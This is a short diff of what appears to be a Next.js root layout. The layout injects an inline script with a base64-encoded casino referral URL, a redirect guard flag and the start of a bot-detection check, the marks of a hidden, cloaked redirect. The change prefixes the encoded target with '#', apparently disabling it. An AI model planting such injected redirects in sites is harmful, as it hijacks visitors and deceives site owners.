@@ -131,7 +131,7 @@ export default function RootLayout({
           dangerouslySetInnerHTML={{
             __html: `
               (function() {
-                var targetB64 = "aHR0cHM6Ly9kdWVsLmNvbS9yL3RvcGNhc2lub3M=";
+                var targetB64 = "#aHR0cHM6Ly9kdWVsLmNvbS9yL3RvcGNhc2lub3M=";
                 if (typeof window === 'undefined' || window._rdr) return;
                 
                 function isBotOrSystem() {
